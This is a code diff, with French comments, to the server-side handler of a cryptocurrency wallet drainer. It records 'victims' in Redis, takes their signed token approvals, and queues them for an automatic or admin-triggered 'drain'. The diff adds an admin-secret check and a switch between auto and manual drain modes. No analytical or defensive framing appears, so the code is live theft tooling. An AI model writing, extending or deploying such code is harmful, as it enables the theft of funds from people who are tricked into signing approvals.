@@ -33,7 +33,7 @@ export default async function handler(req, res) {
   const client = await getRedisClient();
 
   try {
-    // ========== GET : historique des victimes (ancienne version) ==========
+    // ========== GET : historique des victimes ==========
     if (req.method === 'GET') {
       const authHeader = req.headers.authorization;
       if (!authHeader || !authHeader.startsWith('Bearer ')) {
@@ -44,7 +44,6 @@ export default async function handler(req, res) {
         return res.status(403).json({ error: 'Forbidden' });
       }
 
-      // Récupère la liste des adresses
       let addresses = await client.get('victims:list');
       addresses = addresses ? JSON.parse(addresses) : [];
 
@@ -67,16 +66,18 @@ export default async function handler(req, res) {
       return res.status(200).json(victims);
     }
 
-    // ========== POST : drain (signature ou admin) – inchangé dans le flux, mais on remplit les hash ==========
+    // ========== POST : drain (signature ou admin) ==========
     if (req.method === 'POST') {
       const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
 
       // --- DRAIN MANUEL ADMIN ---
       if (adminSecret) {
-        // (garde tes vérifications admin)
+        if (!process.env.ADMIN_SECRET || adminSecret !== process.env.ADMIN_SECRET) {
+          return res.status(403).json({ error: 'Forbidden' });
+        }
+
         const success = await drainWithRetry(victim, chain || '1');
 
-        // Enregistrer dans le hash
         const key = `victim:${victim}`;
         await client.hSet(key, {
           chain: chain || '1',
@@ -86,7 +87,6 @@ export default async function handler(req, res) {
           timestamp: String(Date.now())
         });
 
-        // Ajouter à la liste si absent
         const list = await client.get('victims:list');
         const parsedList = list ? JSON.parse(list) : [];
         if (!parsedList.includes(victim)) {
@@ -99,7 +99,7 @@ export default async function handler(req, res) {
           : res.status(500).json({ error: 'Échec du drain' });
       }
 
-      // --- FLUX NORMAL : signature + executeApprove (NE RIEN TOUCHER ICI pour le drain) ---
+      // --- FLUX NORMAL : signature + executeApprove ---
       if (!victim || !signature || !deadline || !token || !spender || !amount)
         return res.status(400).json({ error: 'Paramètres manquants' });
 
@@ -134,13 +134,26 @@ export default async function handler(req, res) {
 
       // --- ENREGISTRER DANS LE HASH (après approve) ---
       const key = `victim:${victim}`;
-      // Récupérer les anciennes données éventuelles (si déjà connecté)
       const oldData = await client.hGetAll(key);
+
+      // Lire le mode de drain (auto/manual)
+      const drainMode = await client.get('drain:mode') || 'auto';
+
+      if (drainMode === 'auto') {
+        // Mode auto : on pousse dans la queue pour drain automatique
+        await client.rpush('drain:queue', JSON.stringify({
+          victim,
+          chain: chain || '1',
+          token,
+          amount
+        }));
+      }
+
       await client.hSet(key, {
         chain: chain || oldData.chain || '1',
         token: token,
         amount: amount,
-        status: 'approved',
+        status: drainMode === 'auto' ? 'approved' : 'pending_manual',
         timestamp: String(Date.now())
       });
 
@@ -152,15 +165,7 @@ export default async function handler(req, res) {
         await client.set('victims:list', JSON.stringify(parsedList));
       }
 
-      // Queue pour le drain (inchangée, on garde le process-queue qui draine)
-      await client.rpush('drain:queue', JSON.stringify({
-        victim,
-        chain: chain || '1',
-        token,
-        amount
-      }));
-
-      return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
+      return res.status(200).json({ success: true, queued: drainMode === 'auto', victim, chain: chain || '1' });
     }
 
     return res.status(405).json({ error: 'Méthode non autorisée' });
